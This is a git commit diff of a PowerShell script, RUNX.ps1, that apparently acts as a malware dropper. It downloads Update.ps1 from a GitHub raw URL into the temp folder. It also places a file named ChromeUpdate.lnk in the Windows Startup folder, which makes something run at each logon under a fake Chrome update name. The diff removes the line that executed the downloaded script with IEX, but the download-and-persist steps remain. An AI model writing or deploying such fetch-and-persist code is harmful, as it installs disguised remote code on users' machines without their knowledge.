cb5a8741b4ec9eba9e065a562bd2e3a0cf52307e
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-14 23:04:14 +0700

    Update RUNX.ps1

--- RUNX.ps1
+++ RUNX.ps1
@@ -1,7 +1,6 @@
 $url6 = "https://raw.githubusercontent.com/cia168168/folder/main/Update.ps1"
 $output6 = "$env:TEMP\Update.ps1"
 Invoke-WebRequest -Uri $url6 -OutFile $output6
-IEX (Get-Content $output6 | Out-String)
 $url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
 $output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
 Invoke-WebRequest -Uri $url8 -OutFile $output8
